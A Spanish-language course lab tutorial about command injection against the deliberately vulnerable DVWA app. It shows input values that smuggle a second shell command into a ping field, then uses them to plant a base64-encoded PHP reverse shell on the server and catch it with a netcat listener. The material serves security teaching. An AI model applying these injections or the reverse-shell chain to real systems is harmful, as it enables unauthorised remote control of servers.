---
typora-copy-images-to: ../assets/img/fileupload
typora-root-url: ../../
layout: post
categories: tema4 Command Injection
title: Command Injection
conToc: false
header-includes: |
    \usepackage{fancyhdr}
    \pagestyle{fancy}
    \newcommand{\changefont}{%
    \fontsize{8}{11}\selectfont}
    \fancyhead[CO,CE]{}
    \fancyhead[LO,CE]{}
    \fancyfoot[LO,CE]{\changefont https://victorponz.github.io/Ciberseguridad-PePS/}
    \fancyfoot[CO,CE]{}
    \fancyfoot[LE,RO]{\thepage}
    \renewcommand{\headrulewidth}{2pt}
    \renewcommand{\footrulewidth}{1pt}
---

## Práctica - Command injection

> La inyección de comandos es un ataque en el que el objetivo es la ejecución de comandos arbitrarios en el sistema operativo host a través de una aplicación vulnerable. Los ataques de inyección de comandos son posibles cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) a un shell del sistema. En este ataque, los comandos del sistema operativo proporcionados por el atacante generalmente se ejecutan con los privilegios de la aplicación vulnerable. Los ataques de inyección de comandos son posibles en gran parte debido a una validación de entrada insuficiente.

En la **siguiente práctica** vamos a realizar un *reverse shell* mediante la inyección  de comandos desde un campo de texto de un formulario que no realiza una validación de entrada correcta.

Este es una variante del ataque **FileUpload** ya que persigue almacenar un fichero ejecutable con dicho reverse shell.

La máquina DVWA tiene un fallo de seguridad en la página [Command Injection](http://localhost:8080/vulnerabilities/exec/).

![image-20210504191910879](/Ciberseguridad-PePS/assets/img/fileupload/image-20210504191910879.png)

En este formulario se supone que el usuario puede poner una IP a la que hacerle ping. Para descubrir si es vulnerable a Command injection podemos introducir el siguiente comando:

```
127.0.0.1 ; ls
```

Lo que intentamos es que el servidor ejecute también el comando `ls` ya que suponemos que esta es la instrucción que realiza el `ping`

```php
 $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
```

y no comprueba si `$target` es una IP Válida.

**Los pasos son los siguientes:**

1. Descarga el archivo del *reverse shell* desde esta [dirección](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) y guárdalo como `shell.php`

2. Edítalo y cambia la IP por la de tu equipo

![image-20210504175459944](/Ciberseguridad-PePS/assets/img/fileupload/image-20210504175459944.png)



3. Ahora vamos a codificarlo en https://www.base64encode.org/.  

   > **Nota**. Para que ocupe menos espacio es recomendable eliminar los comentarios 

4.  Nos aprovecharnos de la vulnerabilidad para crear un archivo en el servidor mediante la siguiente entrada en el formulario:

   ```
   127.0.0.1 ; echo "pega-aquí-el-código-en-base64" > shell.txt
   ```

   Con este comando estamos creando el archivo `shell.txt` con el código en base64.
   
5. Decodificamos el código mediante la siguiente entrada

   ```
   127.0.0.1 ; cat shell.txt | base64 -d > shell.php
   ```

6. Ya sólo nos queda ejecutar en el ordenador del atacante el comando `netcat`

```bash
nc -v -n -l -p 1234
```

5. Y quedarnos a la espera de una conexión entrante desde el ordenador de la víctima al visitar la url [localhost:8080/vulnerabilities/exec/shell.php](localhost:8080/vulnerabilities/exec/shell.php) del punto 5.

 ![image-20210504193946369](/Ciberseguridad-PePS/assets/img/fileupload/image-20210504193946369.png)

